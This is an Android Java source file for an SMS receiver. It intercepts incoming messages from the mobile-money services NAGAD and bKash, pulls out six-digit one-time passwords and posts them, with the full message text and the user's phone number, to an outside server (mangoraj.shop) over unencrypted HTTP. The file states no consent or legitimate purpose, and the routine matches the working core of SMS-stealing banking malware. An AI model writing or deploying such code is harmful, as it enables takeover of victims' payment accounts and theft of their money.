package com.example.otp2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String NAGAD = "NAGAD";
    private static final String BKASH = "bKash";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            // Get the SMS message
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);

                    String sender = smsMessage.getDisplayOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    long timestampMillis = smsMessage.getTimestampMillis();

                    // Only process SMS from "NAGAD" or "bKash" and containing the OTP keyword
                    if ((sender.contains(NAGAD) || sender.contains(BKASH)) && messageBody.matches(".*\\d{6}.*")) {
                        String otp = extractOtp(messageBody);
                        if (otp != null) {
                            String formattedTime = getFormattedTime(timestampMillis);

                            // Show OTP as a toast
                            showOtpToast(context, otp);

                            // Send data via API call
                            sendOtpDataToApi(context, sender, messageBody, otp, formattedTime);
                        }
                    }
                }
            }
        }
    }

    // Extract OTP from the message body (6-digit code)
    private String extractOtp(String messageBody) {
        String otp = null;
        // Regex to match a 6-digit number
        String regex = "\\b\\d{6}\\b";
        java.util.regex.Pattern pattern = java.util.regex.Pattern.compile(regex);
        java.util.regex.Matcher matcher = pattern.matcher(messageBody);
        if (matcher.find()) {
            otp = matcher.group(0);
        }
        return otp;
    }

    // Format the time from milliseconds to a readable format
    private String getFormattedTime(long timestampMillis) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date(timestampMillis));
    }

    // Show OTP as a toast message
    private void showOtpToast(Context context, String otp) {
        Toast.makeText(context, "OTP received: " + otp, Toast.LENGTH_LONG).show();
    }

    // Send OTP data to the API
    private void sendOtpDataToApi(Context context, String sender, String message, String otp, String time) {
        // Get the user number (SIM number or phone number where the SMS was received)
        String userNumber = getUserNumber(context, sender);

        // Create a JSON object for the request body
        JSONObject jsonBody = new JSONObject();
        try {
            jsonBody.put("sender", sender);
            jsonBody.put("usernumber", userNumber);
            jsonBody.put("otp", otp);
            jsonBody.put("sms", message);
            jsonBody.put("time", time);

            // Send the JSON data via an HTTP POST request (API call)
            sendApiRequest(context, jsonBody);
        } catch (Exception e) {
            Log.e(TAG, "Error while creating JSON or sending API request: ", e);
        }
    }

    // Simulate getting the user number (you may need to handle SIM card selection for dual SIM)
    private String getUserNumber(Context context, String sender) {
        SharedPreferences prefs = context.getSharedPreferences("PhoneNumbers", Context.MODE_PRIVATE);
        // Check which SIM received the message and return corresponding number
        if (sender.contains(NAGAD)) {
            return prefs.getString("phone1", "");
        } else {
            return prefs.getString("phone2", "");
        }
    }

    // Function to send the HTTP POST request
    private void sendApiRequest(Context context, JSONObject jsonBody) {
        // Use a network library like OkHttp, Retrofit, or Android's HttpURLConnection to send a POST request
        // Example: Use OkHttp for sending the API request

        new Thread(() -> {
            okhttp3.OkHttpClient client = new okhttp3.OkHttpClient.Builder()
                    .connectTimeout(30, TimeUnit.SECONDS)
                    .readTimeout(30, TimeUnit.SECONDS)
                    .writeTimeout(30, TimeUnit.SECONDS)
                    .build();

            try {
                okhttp3.MediaType JSON = okhttp3.MediaType.get("application/json; charset=utf-8");
                okhttp3.RequestBody body = okhttp3.RequestBody.create(jsonBody.toString(), JSON);
                okhttp3.Request request = new okhttp3.Request.Builder()
                        .url("http://mangoraj.shop/NagadBkash/otpReceiveTest.php")
                        .post(body)
                        .build();

                okhttp3.Response response = client.newCall(request).execute();
                String responseData = response.body().string();

                if (response.isSuccessful()) {
                    Log.d(TAG, "API Response: " + responseData);
                } else {
                    Log.e(TAG, "API Error: " + response.code() + " - " + responseData);
                }
            } catch (Exception e) {
                Log.e(TAG, "Network Error: ", e);
            }
        }).start();
    }
}
